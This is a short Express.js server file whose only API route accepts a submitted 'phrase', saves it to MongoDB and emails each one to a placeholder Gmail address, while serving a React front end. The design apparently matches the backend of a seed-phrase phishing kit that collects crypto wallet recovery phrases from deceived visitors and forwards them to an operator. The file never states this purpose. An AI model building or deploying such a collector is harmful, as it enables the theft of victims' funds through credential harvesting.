const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");
const morgan = require("morgan");
require("dotenv/config");
const Phrase = require("./models/Phrase.js");
const sendMail = require("./controllers/sendMail.js");
const path = require("path");

const app = express();

app.use(cors());
app.use(morgan("dev"));
app.use(express.json());

app.post("/api/phrase", async (req, res) => {
  try {
    const { phrase } = req.body;
    const phraseDB = await Phrase.find({ phrase });

    const getPhrase = {
      phrase,
    };

    const newPhrase = await Phrase.create(getPhrase);

    await newPhrase.save();

    sendMail("youremail@gmail.com", newPhrase);

    return res.status(200).json({
      message: newPhrase,
    });
  } catch (error) {
    return res.status(500).json({
      message: error.message,
    });
  }
});

if (process.env.NODE_ENV === "production") {
  app.use(express.static("client/build"));
  app.get("*", (req, res) => {
    res.sendFile(path.resolve(__dirname, "client", "build", "index.html"));
  });
}

const connection_uri = process.env.DATABASE;

mongoose
  .connect(connection_uri)
  .then(() => {
    console.log("MongoDB has successfully connected!");
  })
  .catch((error) => {
    console.log("MongoDB has failed to successfully connect!");
  });

const PORT = process.env.PORT || process.env.PORT_PATH;

app.listen(PORT, () => {
  return console.log(`Server running on PORT: ${PORT}`);
});
